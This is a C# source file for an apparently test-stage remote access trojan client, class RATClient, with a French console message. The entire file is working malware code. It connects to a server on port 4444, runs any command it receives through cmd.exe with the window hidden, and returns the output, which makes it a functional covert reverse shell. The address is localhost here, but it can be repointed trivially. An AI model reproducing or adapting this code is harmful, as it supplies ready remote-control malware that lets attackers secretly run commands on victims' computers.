using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
namespace TestRatCmd1
{
    class RATClient
    {
        public static void InitClient()
        {
            Console.Clear();
            TcpClient client = new TcpClient("127.0.0.1", 4444);
            NetworkStream stream = client.GetStream();
            Console.WriteLine("Connecté au serveur !");

            while (true)
            {
                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                Console.WriteLine(command);

                string output = ExecuteCommand(command);

                byte[] data = Encoding.UTF8.GetBytes(output);
                stream.Write(data, 0, data.Length);
            }
        }

        static string ExecuteCommand(string command)
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process process = new Process { StartInfo = psi };
            process.Start();
            string result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return result;
        }
    }
}